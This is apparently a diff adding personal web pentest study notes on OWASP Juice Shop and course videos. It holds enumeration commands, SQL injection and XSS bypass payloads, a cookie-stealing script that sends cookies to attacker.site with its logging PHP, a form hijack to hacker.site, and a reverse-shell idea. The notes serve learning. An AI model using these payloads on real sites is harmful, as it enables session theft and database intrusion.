@@ -1,0 +1,244 @@
+python -m http.server 8000
+
+pentester labs #pluralsight?
+hack.me
+sql workbench and mysql workbench
+
+
+propaghandi - how to clean everything
+bowie - iggy stardust
+bad religion how can hell be any worse
+beatles abbey road
+randy - human atom bombs
+
+to research:
+change file header to appear as different type, create reverse shell from this
+write post request in python with authentication - see start below with borked auth
+write spider in python
+
+additonal tools
+addons: live http header, cookie editor
+after finding xss, use XSS BEEF
+
+installing juice shop
+curl -sL https://deb.nodesource.com/setup_14.x | sudo -E bash -
+sudo apt-get install -y nodejs
+installing docker
+curl -fsSL https://download.docker.com/linux/debian/gpg | sudo apt-key add -
+echo 'deb [arch=amd64] https://download.docker.com/linux/debian buster stable' | sudo tee /etc/apt/sources.list.d/docker.list
+apt-update
+apt-get install docker-ce
+systemctl start docker
+systemctl enable docker
+docker pull bkimminich/juice-shop
+docker run --rm -p 3000:3000 bkimminich/juice-shop
+
+enum
+nikto -host 127.0.0.1 -p 3000 > nikto_out; dirb http://127.0.0.1:3000 /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt > dirb_out; whatweb -v 127.0.0.1:3000 > whatweb_out; 
+
+dirbuster gui -> look for php files, etc.
+backup file extensions:
+php,asp,aspx,inc
+bak,bac,old,000,~,01,_bak,001,Xxx,
+files are viewable from dirbuster gui -> rclick, view response
+run nc requests for each dir 
+
+nc 1.1.1.1 80
+HEAD / HTTP/1.0 <hit enter 2 times>
+OPTIONS / HTTP/1.0 <hit enter 2 times> #if we receive 4xx or 5xx error, options isn't allowed, can still test other things manually
+nc 1.1.1.1 80
+PUT /writeable_dir/text.html HTTP/1.1 
+Content-length: 184 #required in PUT arg #check for 201 created
+
+
+dnsrecon for nameserver enum
+dnsrecon -n 1.1.1.1
+then, dig @nameserver axfr domain.com #axfr=attempt zone xfer
+optionally, fierce -dns domain.com
+
+use developer tools to check these... a suggested tree or table based chart was suggested
+redirects, client side validation, DB interaction -> check sql injection, errors, display of user data, login fields, other input fields, access restricted pages -> check for auth bypass
+js files: look for path definitions
+js files: in upload fields, look for allowedMimeType
+
+shots in the dark
+test.com/news_read/112 -> test if this works test.com/news_read.php?id=112
+
+
+
+
+end internal enum
+
+external enum: 
+netcraft.com
+theharvester - retrieves data from search engines or pgp key servers
+
+#as far as I can tell this is external only, or for already known domains, investigate potentially running with -r
+git clone https://github.com/TheRook/subbrute.git
+python subbrute.py -h
+
+
+end external enum
+
+https://github.com/bkimminich/juice-shop-ctf
+
+
+deserialization:
+ysoserial
+
+http://127.0.0.1:3000
+
+juice shop exercises
+
+initial enum
+nikto -host 127.0.0.1 -p 3000 > nikto_out; dirb http://127.0.0.1:3000 /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt > dirb_out; whatweb -v 127.0.0.1:3000 > whatweb_out; 
+check /.well-known/security.txt
+
+category: broken automation
+---in this case the request contained a captchaid with a value, that we could use to submit new requests with repeater
+
+category: broken authentication
+--- 
+
+category: input validation
+---just changed the burp intercept value plaintext
+
+---api https://owasp.org/www-project-api-security/  API6:2019 Mass Assignment
+response fields differ from what's sent in a request, enter them into a new request manually
+
+---missing encoding 
+we have an area displaying an alt tag for an image, appears that this wasn't encoded properly, we just change the # to the html encoded %23 and it works - and we were able to display other items here by changing the link/encoding - other images from the path tested.
+<img _ngcontent-dkt-c217="" class="image" src="assets/public/images/uploads/😼-#zatschi-#whoneedsfourlegs-1572600969477.jpg" alt="😼 #zatschi #whoneedsfourlegs">
+
+category: sensitive data exposure
+---found a document linked to an ftp site, send this request to repeater with just the base ftp site
+other items were included below in the base dir request, including files that returned when we altered the request
+
+
+
+category: security misconfiguration
+--- we sent a get request to /rest/doesntexist - this returned some info about how errors were handled this was already triggered by nikto/dirb/whatweb
+
+category: input validation
+---found a registration form that didn't validate the 2nd password field for registration - the check was only performed the first time, changing field order seemed to break it
+
+category: unvalidated redirects
+--- dev tools > debugger > check js scripts
+found a redirect link in the main js file
+url: './redirect?to=https://blockchain.info/address/1AbKfgvw9psQ41NbLi8kufDQTezwG8DRZm',
+add this to the end of the main site link 
+
+category: injection
+---sql "email":"admin' or 1=1--'",
+
+---encountered a search bar that queries client side in a SPA, cleared the browser cache to force server side resend
+GET /rest/products/search?q= HTTP/1.1
+GET /rest/products/search?q=apple' HTTP/1.1
+"sql": "SELECT * FROM Products WHERE ((name LIKE '%apple'% OR description LIKE '%apple'%'
+need to close the query to make ((name LIKE '%apple'%')) which is q=apple')) in our request, this will ordinarily return an error if sent back but allows us to add union at the end.  removing the ' terminated the request and didn't work with the following union
+had an issue returning num of columns, pad with 1,2,3,4,5,6,7,8,9 to find correct num in banan then
+url encode this
+UNION SELECT sql,2,3,4,5,6,7,8,9 FROM sqlite_master--
+
+
+---basically bad sanitation routine that didn't remove multiple script tags
+<sCriIPt>alert(`xss`)</sCrIPt>
+<script><sCriIPt>alert(`xss`)</sCrIPt></script>
+<<script>sscript>alert(`xss`)</sCrIPt></script>
+
+
+
+misc notes
+angular uses ngcontent keyword
+
+
+XSS 
+general notes
+tool: php xref 
+look for all points where app outputs data from the user, track it back to the source
+cookie stealing, browser control, exploiting browser plugins then the machine, keylogging
+reflected - single use, mostly used for stealing cookies, can be used to exploit browser to install other malware,etc.
+example given was sending a malicious link that redirects to a diff server - tinyurl, iframes, link in target email, etc.
+
+stored - same effect, stored by the exploited web server
+dom - rendered in dom/js
+
+---so this is one example
+<html><head><title>Test XSS</title></head><body><imgsrc="logo.png" alt="<?= $_GET['name'] ?>"></body></html>
+
+and example payloads
+http://victim.site/index.php?name=<script>alert('XSS Example')</script>
+http://victim.site/index.php?name=" onload="alert('XSS Example')
+" onload="alert(String.fromCharCode(88,83,83))
+
+--- example of cookie stealing
+client bob logs onto alice with user/pass
+alice sends back cookie with sessionid
+any requests from bob-> alice will carry the cookie ?maybe?
+path= can limit to subdir
+
+reflected example:
+http://www.alice.xxx/members/search.php?kw=<script>var i=new Image();i.src="http://attacker.site/steal.php?q="%2bdocument.cookie;</script>
+steal.php contains:
+$fn="log.txt";$fh=fopen($fn,'a');$cookie=$_GET['q'];fwrite($fh,$cookie);fclose($fh);
+
+technical explanation - this is only possible if httponly flag isn't set on teh cookie and secure cookies aren't enabled
+read cookie using js
+redirect cookie to a server we own
+retreive logged cookie 
+
+workaround for same-origin- link to the other site from a subdir -- put this in an html file in the subdir with the xss
+<script>function cookiepath(path) {for (vari= 0; i< window.frames.length; i++) {frameURL= window.frames[i].location.toString();if (frameURL.indexOf(path) > -1)alert(window.frames[i].document.cookie);}}</script><iframeonload="cookiepath('/our_destination_path/')" style="display:none;" src="/path1/index.php"></iframe>
+
+DOM manipulation typically
+document.body.innerHTML="<h1>Defaced</h1>";
+<form name="loginform" method="POST" action="/checklogin.cgi">
+document.forms[0].action="https://hacker.site/steal.php"; site will remain unchanged
+
+
+from juice shop
+category: XSS
+--- we found a search box and put this into it: <iframe src="javascript:alert(`xss`)">
+open the inspector under dev tools, and search for xss, it should show up as an iframe in the html
+an additional payload that attempted to load a site:
+<iframe width="100%" height="166" scrolling="no" frameborder="no" allow="autoplay" src="https://w.soundcloud.com/player/?url=https%3A//api.soundcloud.com/tracks/771984076&color=%23ff5500&auto_play=true&hide_related=false&show_comments=true&show_user=true&show_reposts=false&show_teaser=true"></iframe> 
+
+---sql injection ecppt
+---vid notes finding sql injection
+find vuln area that we can differentiate between true/false
+figure out how to close the query and use a true statement followed by terminator
+ex 
+') or 1=1;--
+---vid notes exploiting in-band sql injections
+balancing injections like 
+#some dbms enforce type matching, some don't
+php?id=200' union select null,null,null; -- -
+#test like this, etc.
+php?id=200' union select 'els1','2',null; -- -
+php?id=200' union select @@version,'2',null; -- -
+
+distinct removes duplicate rows, union implies distinct
+comments # or --
+
+example php static query
+$dbhostname='1.2.3.4';$dbuser='username';$dbpassword='password';$dbname='database';$connection = mysqli_connect($dbhostname, $dbuser, $dbpassword, $dbname);$query = "SELECT Name, Description FROM Products WHERE ID='3' UNION SELECT Username, Password FROM Accounts;";$results = mysqli_query($connection, $query);display_results($results);
+
+dynamic
+$id = $_GET['id'];$connection = mysqli_connect($dbhostname, $dbuser, $dbpassword, $dbname);$query = "SELECT Name, Description FROM Products WHERE ID='$id';";$results = mysqli_query($connection, $query);display_results($results);
+
+other things to check for sql injection
+
+
+python3
+
+send post request, this is working, but missing auth
+
+from urllib import request, parse
+url = "http://127.0.0.1:3000/api/Feedbacks/"
+data = {"UserId":1,"captchaId":0,"captcha":"12","comment":x,"rating":5}
+data = parse.urlencode(data).encode()
+req = request.Request(url, data=data)
+response = request.urlopen(req)
+print (response.read())
+
+{"UserId":1,"captchaId":0,"captcha":"12","comment":"$x","rating":5}
